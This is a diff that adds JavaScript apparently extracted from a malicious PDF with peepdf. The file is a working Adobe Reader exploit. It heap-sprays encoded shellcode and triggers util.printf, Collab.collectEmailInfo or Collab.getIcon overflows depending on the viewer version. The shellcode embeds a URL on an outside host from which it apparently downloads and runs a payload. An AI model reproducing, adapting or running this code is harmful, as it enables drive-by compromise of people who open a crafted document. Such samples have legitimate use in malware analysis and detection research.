@@ -1,0 +1,68 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+this.I1L()
+
+// peepdf comment: Javascript code located in object 13 (version 0)
+
+var g22c = new Array();
+
+function e26k(v62f, x80z) {
+    while (v62f.length * 2 < x80z) {
+        v62f += v62f;
+    }
+    v62f = v62f.substring(0, x80z / 2);
+    return v62f;
+}
+
+function b28g(e70j) {
+    var k40b = 0x0c0c0c0c;
+    var u45m = unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u6D2F%u6D61%u2E6A%u7572%u652F%u7078%u6C2F%u616F%u2E64%u6870%u3F70%u7473%u7461%u4F3D%u6874%u7265%u557C%u6B6E%u6F6E%u6E77%u557C%u7C53%u6E55%u6E6B%u776F%u2F6E%u6F6C%u6461%u702E%u7068%u7326%u313D");
+    if (e70j == 1) {
+        k40b = 0x30303030;
+        u45m = unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u6D2F%u6D61%u2E6A%u7572%u652F%u7078%u6C2F%u616F%u2E64%u6870%u3F70%u7473%u7461%u4F3D%u6874%u7265%u557C%u6B6E%u6F6E%u6E77%u557C%u7C53%u6E55%u6E6B%u776F%u2F6E%u6F6C%u6461%u702E%u7068%u7326%u323D");
+    }
+    if (e70j == 2) {
+        u45m = unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u6D2F%u6D61%u2E6A%u7572%u652F%u7078%u6C2F%u616F%u2E64%u6870%u3F70%u7473%u7461%u4F3D%u6874%u7265%u557C%u6B6E%u6F6E%u6E77%u557C%u7C53%u6E55%u6E6B%u776F%u2F6E%u6F6C%u6461%u702E%u7068%u7326%u333D");
+    }
+    var z52d = 0x400000;
+    var a90m = u45m.length * 2;
+    var x80z = z52d - (a90m + 0x38);
+    var v62f = unescape("%u9090%u9090");
+    v62f = e26k(v62f, x80z);
+    var r18s = (k40b - 0x400000) / z52d;
+    for (var t39a = 0; t39a < r18s; t39a++) {
+        g22c[t39a] = v62f + u45m;
+    }
+}
+
+function f24p() {
+    var k15k = app.viewerVersion.toString();
+    if (k15k > 8) {
+        b28g(1);
+        var j19s = "12999999999999999999";
+        for (p39k = 0; p39k < 276; p39k++) {
+            j19s += "8";
+        }
+        util.printf("%45000f", j19s);
+    }
+    if (k15k < 8) {
+        b28g(0);
+        var b82u = unescape("%u0c0c%u0c0c");
+        while (b82u.length < 44952) b82u += b82u;
+        this.collabStore = Collab.collectEmailInfo({
+            subj: "",
+            msg: b82u
+        });
+    }
+    if (k15k < 9.1) {
+        if (app.doc.Collab.getIcon) {
+            b28g(2);
+            var c64g = unescape("%09");
+            while (c64g.length < 0x4000) c64g += c64g;
+            c64g = "N." + c64g;
+            app.doc.Collab.getIcon(c64g);
+        }
+    }
+}
+f24p();
+
